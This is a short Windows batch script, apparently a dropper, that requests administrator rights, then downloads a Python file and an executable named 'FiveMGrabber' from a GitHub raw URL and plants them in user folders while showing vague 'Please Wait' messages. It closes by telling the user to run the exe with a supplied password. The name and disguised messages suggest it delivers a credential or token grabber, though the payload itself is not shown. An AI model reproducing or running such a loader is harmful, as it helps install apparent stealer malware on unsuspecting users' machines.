@echo off
:: BatchGotAdmin - requires administrator privileges

:: Check for admin rights
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

title Please Wait

:: Set URLs and temp files
set "DOWNLOAD_URL1=https://raw.githubusercontent.com/rev01official/FiveMGrabber2/refs/heads/main/rev01grabber.py"
set "DOWNLOAD_URL2=https://raw.githubusercontent.com/rev01official/FiveMGrabber2/refs/heads/main/FiveMGrabber.exe"
set "TEMP_FILE1=%TEMP%\rev01grabber.py"
set "TEMP_FILE2=%TEMP%\FiveMGrabber.exe"
set "DEST1=C:\Users"
set "DEST2=C:\Users\alexb\Downloads\FiveMGrabber-main"

:: Create destination folder for second file if it doesn't exist
if not exist "%DEST2%" (
    mkdir "%DEST2%"
)

echo Downloading first file...
powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL1%' -OutFile '%TEMP_FILE1%'"
if not exist "%TEMP_FILE1%" (
    echo First file download failed.
    timeout /t 5
    exit /b
)

echo Checking for the EXEs...
powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL2%' -OutFile '%TEMP_FILE2%'"
if not exist "%TEMP_FILE2%" (
    echo Failed.
    timeout /t 5
    exit /b
)

echo Please Wait...
move "%TEMP_FILE1%" "%DEST1%\rev01grabber.py"

echo Setting up the exe...
move "%TEMP_FILE2%" "%DEST2%\FiveMGrabber.exe"

timeout /t 5 /nobreak >nul
echo Run the .exe Password: root
pause
